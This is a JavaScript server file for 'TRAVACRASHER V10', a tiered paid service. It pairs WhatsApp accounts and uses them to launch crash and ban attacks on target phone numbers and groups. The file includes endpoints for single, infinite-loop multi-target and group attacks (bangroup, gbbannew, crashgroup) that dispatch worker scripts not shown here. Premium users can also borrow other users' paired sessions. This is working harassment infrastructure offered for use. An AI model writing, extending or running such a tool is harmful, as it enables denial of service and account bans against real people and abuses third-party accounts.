// ============================================
// TRAVACRASHER BUG VIA WEB — API Server
// ============================================
require('dotenv').config();
const express = require('express');
const { Worker } = require('worker_threads');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ==================== CONFIG ====================
const ADMIN_KEY = process.env.API_KEY || 'change-this-secret';
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.MAIN_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID || '6066724720';
const ADMIN_IDS = (process.env.ADMIN_IDS || ADMIN_ID)
    .split(',')
    .map(id => id.trim())
    .filter(id => id.length > 0);

const WORKER_TIMEOUT = 120000;
const RATE_LIMIT_WINDOW = 60000;
const RATE_LIMIT_MAX = 20;
const OTP_EXPIRY = 5 * 60 * 1000;

const SILENT_LOGGER = pino({ level: 'silent' });

// ==================== GLOBAL STATE ====================
const lockedSessions = new Map(); // sessionNumber -> { userId, lockedAt }
const activePermanentAttacks = {}; // Stores active permanent workers by attackId
const activeGroupAttacks = {};     // Stores active group attack workers by attackId
const pairingSockets = new Map();  // Tracks sockets during web pairing process

// ==================== DIRS ====================
const dirs = ['./Love', './Love/auth', './logs', './users'];
dirs.forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });

const DB_PATH = './users/users.json';
const OTP_PATH = './users/otp.json';
const LOG_PATH = './logs/api.log';

// ==================== INIT DB ====================
if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify({
        users: [],
        stats: { totalAttacks: 0, totalPairs: 0 }
    }, null, 2));
}
if (!fs.existsSync(OTP_PATH)) {
    fs.writeFileSync(OTP_PATH, JSON.stringify({ otps: [] }, null, 2));
}

// ==================== LOGGER ====================
function apiLog(level, message, meta = {}) {
    const timestamp = new Date().toISOString();
    const line = `[${timestamp}] [${level.toUpperCase()}] ${message} ${JSON.stringify(meta)}\n`;
    fs.appendFileSync(LOG_PATH, line);
    console.log(line.trim());
}

// ==================== HELPERS ====================
function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

function generateOTP() {
    return String(Math.floor(100000 + Math.random() * 900000));
}

function loadUsers() {
    try { return JSON.parse(fs.readFileSync(DB_PATH, 'utf8')); }
    catch { return { users: [], stats: { totalAttacks: 0, totalPairs: 0 } }; }
}

function saveUsers(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function loadOTPs() {
    try { return JSON.parse(fs.readFileSync(OTP_PATH, 'utf8')); }
    catch { return { otps: [] }; }
}

function saveOTPs(data) {
    fs.writeFileSync(OTP_PATH, JSON.stringify(data, null, 2));
}

function getUserTier(userId) {
    if (ADMIN_IDS.includes(String(userId))) return 'admin';
    try {
        const dbPath = './Love/data.json';
        if (!fs.existsSync(dbPath)) return 'free';
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const uid = String(userId);
        if ((db.resellers || []).includes(uid)) return 'reseller';
        const premium = db.premium || [];
        const premEntry = premium.find(p => {
            const id = typeof p === 'string' ? p : p.id;
            if (id !== uid) return false;
            if (typeof p === 'object' && p.expiresAt) return p.expiresAt > Date.now();
            return true;
        });
        if (premEntry) return 'premium';
        return 'free';
    } catch { return 'free'; }
}

function getAllWhatsAppSessions() {
    const authBase = './Love/auth';
    if (!fs.existsSync(authBase)) return [];
    const sessions = [];
    const chatIds = fs.readdirSync(authBase);
    for (const chatId of chatIds) {
        const chatPath = path.join(authBase, chatId);
        if (!fs.statSync(chatPath).isDirectory()) continue;
        const numbers = fs.readdirSync(chatPath);
        for (const num of numbers) {
            if (fs.existsSync(path.join(chatPath, num, 'creds.json'))) {
                sessions.push({ chatId, number: num, path: path.join(chatPath, num) });
            }
        }
    }
    return sessions;
}

// ==================== TELEGRAM SEND ====================
async function sendTelegramMessage(chatId, text) {
    if (!BOT_TOKEN) throw new Error('Bot token not configured');
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.description || 'Failed to send');
    return data;
}

// ==================== AUTH MIDDLEWARE ====================
function auth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || req.query.token;
    if (!token) return res.status(401).json({ error: 'No token' });
    if (token === ADMIN_KEY) {
        req.user = { id: ADMIN_ID, username: 'admin', tier: 'admin' };
        return next();
    }
    const db = loadUsers();
    const user = db.users.find(u => u.token === token);
    if (!user) return res.status(401).json({ error: 'Invalid token' });
    user.tier = getUserTier(user.id);
    req.user = user;
    next();
}

function requireAdmin(req, res, next) {
    if (req.user.tier !== 'admin') return res.status(403).json({ error: 'Admin only' });
    next();
}

// ==================== RATE LIMIT ====================
const rateLimitMap = {};
function rateLimit(req, res, next) {
    const key = req.user?.id || req.ip;
    const now = Date.now();
    if (!rateLimitMap[key]) rateLimitMap[key] = [];
    rateLimitMap[key] = rateLimitMap[key].filter(t => now - t < RATE_LIMIT_WINDOW);
    if (rateLimitMap[key].length >= RATE_LIMIT_MAX) {
        return res.status(429).json({ error: 'Too many requests' });
    }
    rateLimitMap[key].push(now);
    next();
}

// ==================== OTP ROUTES ====================
app.post('/api/auth/request-otp', async (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'Chat ID required' });
    if (!/^\d{6,}$/.test(String(userId))) return res.status(400).json({ error: 'Invalid Chat ID' });

    try {
        const code = generateOTP();
        const expiresAt = Date.now() + OTP_EXPIRY;
        const otpData = loadOTPs();
        otpData.otps = otpData.otps.filter(o => o.userId !== String(userId) && o.expiresAt > Date.now());
        otpData.otps.push({ userId: String(userId), code, expiresAt, createdAt: Date.now() });
        saveOTPs(otpData);

        const message =
            `🔐 <b>TRAVA-CRASHER V10 — Login Code</b>\n\n` +
            `<b>${code}</b>\n\n` +
            `Code expires in 5 minutes.\n` +
            `If you didn't request this, ignore.`;

        await sendTelegramMessage(userId, message);
        apiLog('info', 'OTP sent', { userId });
        res.json({ success: true, expiresIn: 300 });

    } catch (e) {
        apiLog('error', 'OTP request failed', { error: e.message, userId });
        const msg = (e.message || '').toLowerCase();

        if (msg.includes('chat not found') || msg.includes('user not found')) {
            return res.status(404).json({
                error: 'Bot can\'t message you.\n\n1. Open: https://t.me/travacrasherV10bot. Click START\n3. Send /start\n4. Try again'
            });
        }
        if (msg.includes('blocked')) {
            return res.status(403).json({ error: 'You blocked the bot. Unblock and try again.' });
        }
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/auth/verify-otp', (req, res) => {
    const { userId, code } = req.body;
    if (!userId || !code) return res.status(400).json({ error: 'Chat ID and code required' });

    const otpData = loadOTPs();
    const otp = otpData.otps.find(o => o.userId === String(userId) && o.code === String(code));
    if (!otp) return res.status(401).json({ error: 'Invalid code' });
    if (otp.expiresAt < Date.now()) return res.status(401).json({ error: 'Code expired' });

    otpData.otps = otpData.otps.filter(o => o.userId !== String(userId));
    saveOTPs(otpData);

    const db = loadUsers();
    let user = db.users.find(u => String(u.id) === String(userId));

    if (!user) {
        user = {
            id: String(userId),
            username: `user_${userId}`,
            tier: getUserTier(userId),
            token: generateToken(),
            createdAt: Date.now(),
            lastLogin: Date.now(),
            totalAttacks: 0
        };
        db.users.push(user);
    } else {
        user.token = generateToken();
        user.lastLogin = Date.now();
        user.tier = getUserTier(userId);
    }
    saveUsers(db);
    apiLog('info', 'User logged in', { userId, tier: user.tier });

    res.json({
        success: true,
        token: user.token,
        user: { id: user.id, username: user.username, tier: user.tier }
    });
});

// ==================== USER INFO ====================
app.get('/api/auth/me', auth, (req, res) => {
    const userId = req.user.id;
    const tier = getUserTier(userId);

    const userAuthDir = `./Love/auth/${userId}`;
    let pairedSessions = [];
    if (fs.existsSync(userAuthDir)) {
        pairedSessions = fs.readdirSync(userAuthDir).filter(n =>
            fs.existsSync(path.join(userAuthDir, n, 'creds.json'))
        );
    }

    let expiresAt = null;
    if (tier === 'premium' || tier === 'reseller') {
        try {
            const db = JSON.parse(fs.readFileSync('./Love/data.json', 'utf8'));
            const entry = (db.premium || []).find(p => {
                const id = typeof p === 'string' ? p : p.id;
                return id === String(userId);
            });
            if (entry && typeof entry === 'object') expiresAt = entry.expiresAt || null;
        } catch {}
    }

    res.json({
        user: {
            id: req.user.id,
            username: req.user.username,
            tier,
            expiresAt,
            paired: pairedSessions.length > 0,
            pairedNumbers: pairedSessions,
            totalAttacks: req.user.totalAttacks || 0
        }
    });
});

app.post('/api/auth/logout', auth, (req, res) => res.json({ success: true }));

// ==================== PAIRING ====================
app.get('/api/pair/sessions', auth, (req, res) => {
    const tier = req.user.tier;
    const sessions = [];

    const buildSessionEntry = (number, ownerId) => {
        const lockInfo = lockedSessions.get(number);
        return {
            number,
            owner: ownerId,
            isLocked: Boolean(lockInfo),
            lockedBy: lockInfo ? lockInfo.userId : null,
            lockedAt: lockInfo ? lockInfo.lockedAt : null
        };
    };

    if (tier === 'admin' || tier === 'premium' || tier === 'reseller') {
        const allSessions = getAllWhatsAppSessions();
        allSessions.forEach(s => {
            sessions.push(buildSessionEntry(s.number, s.chatId));
        });
    } else {
        const userAuthDir = `./Love/auth/${req.user.id}`;
        if (fs.existsSync(userAuthDir)) {
            fs.readdirSync(userAuthDir).forEach(num => {
                if (fs.existsSync(path.join(userAuthDir, num, 'creds.json'))) {
                    sessions.push(buildSessionEntry(num, req.user.id));
                }
            });
        }
    }
    res.json({ sessions });
});

// ==================== PAIRING REQUEST (WEB) ====================
app.post('/api/pair/request', auth, async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ error: 'Number required' });

    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (cleanNumber.length < 10) return res.status(400).json({ error: 'Invalid number' });

    const userId = req.user.id;
    const authPath = `./Love/auth/${userId}/${cleanNumber}`;
    
    if (!fs.existsSync(authPath)) fs.mkdirSync(authPath, { recursive: true });

    try {
        // Close existing pairing socket if present
        if (pairingSockets.has(cleanNumber)) {
            try { pairingSockets.get(cleanNumber).end(undefined); } catch(e){}
            pairingSockets.delete(cleanNumber);
        }

        const { state, saveCreds } = await useMultiFileAuthState(authPath);
        
        const sock = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });

        sock.ev.on('creds.update', saveCreds);
        
        // Wait a moment for socket init
        await new Promise(r => setTimeout(r, 1500));

        // Request the pairing code
        const code = await sock.requestPairingCode(cleanNumber);
        
        // Store socket to keep it alive
        pairingSockets.set(cleanNumber, sock);
        
        // Auto-close after 2 minutes if no success
        setTimeout(() => {
            if (pairingSockets.has(cleanNumber)) {
                try { pairingSockets.get(cleanNumber).end(undefined); } catch(e){}
                pairingSockets.delete(cleanNumber);
            }
        }, 120000); 

        // Watch for successful connection
        sock.ev.on('connection.update', (update) => {
            if (update.connection === 'open') {
                apiLog('success', 'Web pairing successful', { userId, number: cleanNumber });
                
                // Notify Telegram bot to reload sessions
                const signalPath = './Love/restart-queue.json';
                let queue = { pending: [] };
                try {
                    if (fs.existsSync(signalPath)) queue = JSON.parse(fs.readFileSync(signalPath, 'utf8'));
                    if (!queue.pending) queue.pending = [];
                } catch (e) {}
                
                if (!queue.pending.find(p => p.chatId === userId && p.number === cleanNumber)) {
                    queue.pending.push({ chatId: userId, number: cleanNumber, requestedAt: Date.now() });
                    fs.writeFileSync(signalPath, JSON.stringify(queue, null, 2));
                }

                // Clean up socket from map
                pairingSockets.delete(cleanNumber);
            }
        });

        res.json({ success: true, code });

    } catch (e) {
        apiLog('error', 'Web pair request failed', { error: e.message, number: cleanNumber });
        res.status(500).json({ error: e.message });
    }
});

// ==================== ATTACK (STANDARD) ====================
app.post('/api/attack', auth, rateLimit, async (req, res) => {
    const startTime = Date.now();
    const { attackType, target, count, sessionNumber } = req.body;

    if (!attackType || !target) return res.status(400).json({ error: 'Missing fields' });
    const cleanTarget = String(target).replace(/[^0-9]/g, '');
    if (cleanTarget.length < 10) return res.status(400).json({ error: 'Invalid number' });

    const tier = req.user.tier;
    let authPath = null;
    let sessionToLock = null;

    if (sessionNumber) {
        const userSpecificPath = `./Love/auth/${req.user.id}/${sessionNumber}`;
        const isPrivileged = (tier === 'admin' || tier === 'premium' || tier === 'reseller');

        if (fs.existsSync(userSpecificPath) && fs.existsSync(path.join(userSpecificPath, 'creds.json'))) {
            authPath = userSpecificPath;
        } else if (isPrivileged) {
            const globalSessions = getAllWhatsAppSessions();
            const found = globalSessions.find(s => s.number === sessionNumber);
            if (found) authPath = found.path;
        }

        if (!authPath) return res.status(404).json({ error: 'Selected session not found or disconnected.' });
        if (lockedSessions.has(sessionNumber)) {
            return res.status(400).json({ error: 'This session is currently busy with another attack.' });
        }
        sessionToLock = sessionNumber;
    } else {
        // ── Pick from AVAILABLE (unlocked) sessions only ──
        if (tier === 'admin' || tier === 'premium' || tier === 'reseller') {
            const allSessions = getAllWhatsAppSessions();
            const available = allSessions.filter(s => !lockedSessions.has(s.number));
            if (available.length === 0) {
                return res.status(500).json({ error: allSessions.length === 0 ? 'No bot sessions' : 'All sessions are currently busy. Try again shortly.' });
            }
            const randomSession = available[Math.floor(Math.random() * available.length)];
            authPath = randomSession.path;
            sessionToLock = randomSession.number;
        } else {
            const userAuthDir = `./Love/auth/${req.user.id}`;
            if (!fs.existsSync(userAuthDir)) {
                return res.status(403).json({ error: 'Free tier requires pairing WhatsApp first' });
            }
            const valid = fs.readdirSync(userAuthDir).filter(n =>
                fs.existsSync(path.join(userAuthDir, n, 'creds.json'))
            );
            if (valid.length === 0) return res.status(403).json({ error: 'No active sessions' });
            const available = valid.filter(n => !lockedSessions.has(n));
            if (available.length === 0) {
                return res.status(429).json({ error: 'All of your sessions are busy. Wait for current attacks to finish.' });
            }
            const randomNum = available[Math.floor(Math.random() * available.length)];
            authPath = path.join(userAuthDir, randomNum);
            sessionToLock = randomNum;
        }
    }

    if (sessionToLock) lockedSessions.set(sessionToLock, { userId: req.user.id, lockedAt: Date.now() });

    apiLog('info', 'Attack started', { user: req.user.username, tier, attackType, target: cleanTarget, session: sessionToLock });

    const worker = new Worker(path.join(__dirname, 'attackWorker.js'), {
        workerData: { authPath, attackType, targetJid: `${cleanTarget}@s.whatsapp.net`, count: count || 1 }
    });

    let responded = false;

    const unlockAndFinish = (response, isError = false) => {
        if (sessionToLock) lockedSessions.delete(sessionToLock);
        if (!responded) {
            responded = true;
            if (isError) res.status(500).json(response);
            else res.json(response);
        }
    };

    worker.on('message', (msg) => {
        if (msg.type === 'done') {
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const db = loadUsers();
            const u = db.users.find(x => x.id === req.user.id);
            if (u) u.totalAttacks = (u.totalAttacks || 0) + 1;
            saveUsers(db);
            unlockAndFinish({ success: true, result: msg, elapsed, sessionNumber: sessionToLock });
        } else if (msg.type === 'error') {
            unlockAndFinish({ error: msg.error }, true);
        }
    });

    worker.on('error', (err) => {
        unlockAndFinish({ error: err.message }, true);
    });

    setTimeout(() => {
        if (!responded) {
            worker.terminate();
            unlockAndFinish({ error: 'Timeout' }, true);
        }
    }, WORKER_TIMEOUT);
});

// ==================== ATTACK (PERMANENT - MULTI-TARGET) ====================
app.post('/api/attack/permanent/start', auth, rateLimit, async (req, res) => {
    const { attackType, targets, sessionNumber } = req.body;
    const userId = req.user.id;

    if (!attackType || !sessionNumber || !Array.isArray(targets) || targets.length === 0) {
        return res.status(400).json({ error: 'Missing required fields or no targets provided.' });
    }

    const tier = req.user.tier;
    const isPrivileged = (tier === 'admin' || tier === 'premium' || tier === 'reseller');
    let authPath = null;

    const userSpecificPath = `./Love/auth/${userId}/${sessionNumber}`;
    if (fs.existsSync(userSpecificPath) && fs.existsSync(path.join(userSpecificPath, 'creds.json'))) {
        authPath = userSpecificPath;
    } else if (isPrivileged) {
        const globalSessions = getAllWhatsAppSessions();
        const found = globalSessions.find(s => s.number === sessionNumber);
        if (found) authPath = found.path;
    }

    if (!authPath) {
        return res.status(404).json({ error: 'Session not found or disconnected.' });
    }

    if (lockedSessions.has(sessionNumber)) {
        return res.status(400).json({ error: 'This session is already running an attack. Please wait or select another.' });
    }

    const cleanTargets = targets
        .map(t => String(t).replace(/[^0-9]/g, ''))
        .filter(t => t.length >= 10);

    if (cleanTargets.length === 0) {
        return res.status(400).json({ error: 'No valid target numbers provided.' });
    }

    lockedSessions.set(sessionNumber, { userId, lockedAt: Date.now() });

    const attackId = crypto.randomBytes(8).toString('hex');
    const workers = [];

    apiLog('info', 'Permanent Attack started', { user: req.user.username, attackType, sessionNumber, targetCount: cleanTargets.length });

    for (const target of cleanTargets) {
        const targetJid = `${target}@s.whatsapp.net`;
        const worker = new Worker(path.join(__dirname, 'attackWorker.js'), {
            workerData: {
                authPath,
                attackType,
                targetJid,
                infiniteLoop: true
            }
        });
        workers.push(worker);
    }

    activePermanentAttacks[attackId] = { workers, userId, sessionNumber };

    res.json({
        success: true,
        attackId,
        message: `Permanent attack started on ${cleanTargets.length} number(s). Running until stopped.`
    });

    workers.forEach((worker, index) => {
        worker.on('message', (msg) => {
            if (msg.type === 'error') {
                apiLog('error', `Permanent worker ${index} reported error`, { error: msg.error });

                const attack = activePermanentAttacks[attackId];
                if (attack) {
                    attack.workers = attack.workers.filter(w => w !== worker);

                    if (attack.workers.length === 0) {
                        lockedSessions.delete(sessionNumber);
                        delete activePermanentAttacks[attackId];
                        apiLog('info', 'All workers died, session unlocked', { sessionNumber, attackId });
                    }
                }
            }
        });

        worker.on('error', (err) => {
            apiLog('error', `Permanent worker ${index} thread error`, { error: err.message });
            const attack = activePermanentAttacks[attackId];
            if (attack) {
                attack.workers = attack.workers.filter(w => w !== worker);
                if (attack.workers.length === 0) {
                    lockedSessions.delete(sessionNumber);
                    delete activePermanentAttacks[attackId];
                }
            }
        });
    });
});

// ==================== PERMANENT ATTACK: STATUS CHECK ====================
app.post('/api/attack/permanent/status', auth, (req, res) => {
    const { attackId } = req.body;
    const attack = activePermanentAttacks[attackId];
    if (!attack) return res.json({ active: false });

    const alive = attack.workers.some(w => w.threadId !== null && w.threadId !== undefined);
    res.json({ active: alive });
});

app.post('/api/attack/permanent/stop', auth, (req, res) => {
    const { attackId } = req.body;
    if (!attackId) return res.status(400).json({ error: 'attackId required' });

    const attack = activePermanentAttacks[attackId];
    if (!attack) return res.status(404).json({ error: 'Attack not found or already stopped.' });

    if (attack.userId !== req.user.id && req.user.tier !== 'admin') {
        return res.status(403).json({ error: 'Not authorized to stop this attack.' });
    }

    attack.workers.forEach(w => w.terminate());
    lockedSessions.delete(attack.sessionNumber);
    delete activePermanentAttacks[attackId];

    apiLog('info', 'Permanent attack stopped by user', { user: req.user.username, attackId, sessionNumber: attack.sessionNumber });
    res.json({ success: true, message: 'Permanent attack stopped successfully.' });
});

// ==================== GROUP ATTACK ====================
app.post('/api/attack/group', auth, rateLimit, async (req, res) => {
    const { groupLink, sessionNumber, attackType, duration } = req.body;

    if (!groupLink || !sessionNumber || !attackType) {
        return res.status(400).json({ error: 'Missing groupLink, sessionNumber, or attackType' });
    }
    if (!['bangroup', 'gbbannew', 'crashgroup'].includes(attackType)) {
        return res.status(400).json({ error: 'Invalid attackType — must be bangroup, gbbannew, or crashgroup' });
    }
    if (!/chat\.whatsapp\.com\/[A-Za-z0-9]+/.test(String(groupLink))) {
        return res.status(400).json({ error: 'Invalid group link format' });
    }

    const tier = req.user.tier;
    const isPrivileged = (tier === 'admin' || tier === 'premium' || tier === 'reseller');

    let authPath = null;
    const userSpecificPath = `./Love/auth/${req.user.id}/${sessionNumber}`;
    if (fs.existsSync(userSpecificPath) && fs.existsSync(path.join(userSpecificPath, 'creds.json'))) {
        authPath = userSpecificPath;
    } else if (isPrivileged) {
        const globalSessions = getAllWhatsAppSessions();
        const found = globalSessions.find(s => s.number === sessionNumber);
        if (found) authPath = found.path;
    }

    if (!authPath) return res.status(404).json({ error: 'Selected session not found or disconnected.' });
    if (lockedSessions.has(sessionNumber)) {
        return res.status(400).json({ error: 'This session is currently busy with another attack.' });
    }

    const existing = Object.values(activeGroupAttacks).find(a => a.userId === req.user.id);
    if (existing) {
        return res.status(429).json({ error: 'You already have a group attack running. Stop it first.' });
    }

    const durationMs = Math.min(Math.max(parseInt(duration) || 120000, 30000), 600000);
    const attackId = crypto.randomBytes(8).toString('hex');

    lockedSessions.set(sessionNumber, { userId: req.user.id, lockedAt: Date.now() });

    apiLog('info', 'Group attack started', {
        user: req.user.username, attackType, sessionNumber,
        groupLink, durationMs
    });

    const worker = new Worker(path.join(__dirname, 'groupAttackWorker.js'), {
        workerData: { authPath, groupLink, attackType, durationMs }
    });

    activeGroupAttacks[attackId] = {
        worker, userId: req.user.id, sessionNumber, startedAt: Date.now()
    };

    let responded = false;

    const cleanup = () => {
        lockedSessions.delete(sessionNumber);
        delete activeGroupAttacks[attackId];
    };

    worker.on('message', (msg) => {
        if (msg.type === 'info') {
            if (!responded) {
                responded = true;
                res.json({
                    success: true,
                    attackId,
                    groupName: msg.groupName,
                    groupId: msg.groupId,
                    participants: msg.participants,
                    durationMs,
                });
            }
        } else if (msg.type === 'done') {
            cleanup();
        } else if (msg.type === 'error') {
            cleanup();
            if (!responded) {
                responded = true;
                res.status(500).json({ error: msg.error });
            }
        }
    });

    worker.on('error', (err) => {
        cleanup();
        if (!responded) {
            responded = true;
            res.status(500).json({ error: err.message });
        }
    });

    setTimeout(() => {
        if (!responded) {
            responded = true;
            worker.terminate();
            cleanup();
            res.status(500).json({ error: 'Timeout resolving group' });
        }
    }, 30000);
});

app.post('/api/attack/group/stop', auth, (req, res) => {
    const { attackId } = req.body;
    if (!attackId) return res.status(400).json({ error: 'attackId required' });

    const attack = activeGroupAttacks[attackId];
    if (!attack) return res.status(404).json({ error: 'Attack not found or already stopped.' });

    if (attack.userId !== req.user.id && req.user.tier !== 'admin') {
        return res.status(403).json({ error: 'Not authorized.' });
    }

    try { attack.worker.postMessage({ type: 'stop' }); } catch (e) {}
    setTimeout(() => { try { attack.worker.terminate(); } catch (e) {} }, 3000);

    lockedSessions.delete(attack.sessionNumber);
    delete activeGroupAttacks[attackId];

    apiLog('info', 'Group attack stopped', { user: req.user.username, attackId });
    res.json({ success: true });
});

// ==================== STATS ====================
app.get('/api/stats', auth, (req, res) => {
    const userId = req.user.id;
    const allSessions = getAllWhatsAppSessions();
    const userDir = `./Love/auth/${userId}`;
    let userSessions = 0;
    if (fs.existsSync(userDir)) {
        userSessions = fs.readdirSync(userDir).filter(n =>
            fs.existsSync(path.join(userDir, n, 'creds.json'))
        ).length;
    }
    res.json({
        tier: req.user.tier,
        userSessions,
        botSessions: allSessions.length,
        totalAttacks: req.user.totalAttacks || 0
    });
});

// ==================== COMMANDS ====================
app.get('/api/commands', auth, (req, res) => {
    try {
        const cmdBuilder = require('./cmdBuilder');
        res.json({ commands: cmdBuilder.getAllCommandsWithBuiltIn() });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// ==================== ADMIN — FULL SESSIONS WITH STATUS ====================
app.get('/api/admin/sessions/full', auth, requireAdmin, (req, res) => {
    try {
        const authBase = './Love/auth';
        if (!fs.existsSync(authBase)) return res.json({ sessions: [], total: 0, connected: 0, disconnected: 0 });

        const sessions = [];
        fs.readdirSync(authBase).forEach(chatId => {
            const chatPath = path.join(authBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) return;

            fs.readdirSync(chatPath).forEach(number => {
                const sessionPath = path.join(chatPath, number);
                const credsPath = path.join(sessionPath, 'creds.json');

                if (!fs.existsSync(credsPath)) return;

                let stat = { size: 0, mtime: Date.now(), ctime: Date.now() };
                try {
                    const st = fs.statSync(sessionPath);
                    stat = { size: st.size, mtime: st.mtime, ctime: st.ctime };
                } catch (e) {}

                let connected = false;
                let lastSeen = null;
                let registered = false;
                try {
                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
                    registered = !!creds.registered;
                    connected = !!(creds.me && creds.registered);
                    lastSeen = creds.registered ? 'Active' : 'Never';
                } catch (e) {}

                let userName = null;
                try {
                    const users = JSON.parse(fs.readFileSync('./users/users.json', 'utf8'));
                    const u = (users.users || []).find(u => u.id === chatId);
                    if (u) userName = u.username;
                } catch (e) {}

                sessions.push({
                    chatId,
                    number,
                    path: sessionPath,
                    connected,
                    registered,
                    lastSeen,
                    userName: userName || `user_${chatId}`,
                    size: stat.size,
                    createdAt: stat.ctime,
                    modifiedAt: stat.mtime
                });
            });
        });

        sessions.sort((a, b) => b.modifiedAt - a.modifiedAt);

        const connectedCount = sessions.filter(s => s.connected).length;

        res.json({
            sessions,
            total: sessions.length,
            connected: connectedCount,
            disconnected: sessions.length - connectedCount,
            timestamp: Date.now()
        });
    } catch (e) {
        apiLog('error', 'Full sessions error', { error: e.message });
        res.status(500).json({ error: e.message });
    }
});

// ==================== ADMIN — RESTART SESSION ====================
app.post('/api/admin/sessions/restart', auth, requireAdmin, async (req, res) => {
    try {
        const { chatId, number } = req.body;
        if (!chatId || !number) return res.status(400).json({ error: 'chatId and number required' });

        const sessionPath = `./Love/auth/${chatId}/${number}`;
        if (!fs.existsSync(sessionPath)) return res.status(404).json({ error: 'Session not found' });

        const credsPath = path.join(sessionPath, 'creds.json');
        if (fs.existsSync(credsPath)) {
            const now = Date.now() / 1000;
            fs.utimesSync(credsPath, now, now);
        }

        const signalPath = './Love/restart-queue.json';
        let queue = { pending: [] };
        try {
            if (fs.existsSync(signalPath)) queue = JSON.parse(fs.readFileSync(signalPath, 'utf8'));
            if (!queue.pending) queue.pending = [];
        } catch (e) {}

        if (!queue.pending.find(p => p.chatId === chatId && p.number === number)) {
            queue.pending.push({ chatId, number, requestedAt: Date.now() });
            fs.writeFileSync(signalPath, JSON.stringify(queue, null, 2));
        }

        apiLog('info', 'Session restart requested', { chatId, number });
        res.json({ success: true, message: 'Restart signal sent' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ==================== ADMIN — DELETE SESSION ====================
app.post('/api/admin/sessions/delete-full', auth, requireAdmin, (req, res) => {
    try {
        const { chatId, number } = req.body;
        if (!chatId || !number) return res.status(400).json({ error: 'chatId and number required' });

        const sessionPath = `./Love/auth/${chatId}/${number}`;
        if (!fs.existsSync(sessionPath)) return res.status(404).json({ error: 'Session not found' });

        fs.rmSync(sessionPath, { recursive: true, force: true });

        apiLog('info', 'Admin deleted session', { chatId, number });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ==================== ADMIN — USER SESSIONS GROUPED ====================
app.get('/api/admin/user-sessions', auth, requireAdmin, (req, res) => {
    try {
        const authBase = './Love/auth';
        if (!fs.existsSync(authBase)) return res.json({ users: [], totalUsers: 0, totalSessions: 0 });

        const users = [];
        fs.readdirSync(authBase).forEach(chatId => {
            const chatPath = path.join(authBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) return;

            const valid = fs.readdirSync(chatPath).filter(n =>
                fs.existsSync(path.join(chatPath, n, 'creds.json'))
            );

            if (valid.length > 0) {
                let userName = `user_${chatId}`;
                try {
                    const usersDb = JSON.parse(fs.readFileSync('./users/users.json', 'utf8'));
                    const u = (usersDb.users || []).find(u => u.id === chatId);
                    if (u) userName = u.username;
                } catch (e) {}

                users.push({
                    chatId,
                    userName,
                    sessions: valid,
                    count: valid.length
                });
            }
        });

        res.json({
            users,
            totalUsers: users.length,
            totalSessions: users.reduce((a, b) => a + b.count, 0)
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ==================== ADMIN — USERS ====================
app.get('/api/admin/users', auth, requireAdmin, (req, res) => {
    const db = loadUsers();
    const users = db.users.map(u => ({
        id: u.id,
        username: u.username,
        tier: getUserTier(u.id),
        totalAttacks: u.totalAttacks || 0,
        createdAt: u.createdAt,
        lastLogin: u.lastLogin
    }));
    res.json({ users, count: users.length });
});

app.post('/api/admin/premium/add', auth, requireAdmin, (req, res) => {
    const { userId, duration } = req.body;
    if (!userId) return res.status(400).json({ error: 'userId required' });
    try {
        const dbPath = './Love/data.json';
        const db = fs.existsSync(dbPath) ? JSON.parse(fs.readFileSync(dbPath, 'utf8')) : { premium: [], resellers: [] };
        if (!db.premium) db.premium = [];

        let expiresAt = null;
        if (duration && duration !== 'perm') {
            const m = String(duration).match(/^(\d+)(d|h|m|s|w)$/);
            if (m) {
                const v = parseInt(m[1]);
                const u = m[2];
                const mult = u === 'd' ? 86400000 : u === 'h' ? 3600000 : u === 'm' ? 60000 : u === 's' ? 1000 : 604800000;
                expiresAt = Date.now() + (v * mult);
            }
        }

        const idx = db.premium.findIndex(p => (p.id || p) === userId);
        if (idx !== -1) db.premium[idx] = { id: userId, expiresAt };
        else db.premium.push({ id: userId, expiresAt });

        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/premium/remove', auth, requireAdmin, (req, res) => {
    const { userId } = req.body;
    try {
        const dbPath = './Love/data.json';
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        db.premium = (db.premium || []).filter(p => (p.id || p) !== userId);
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

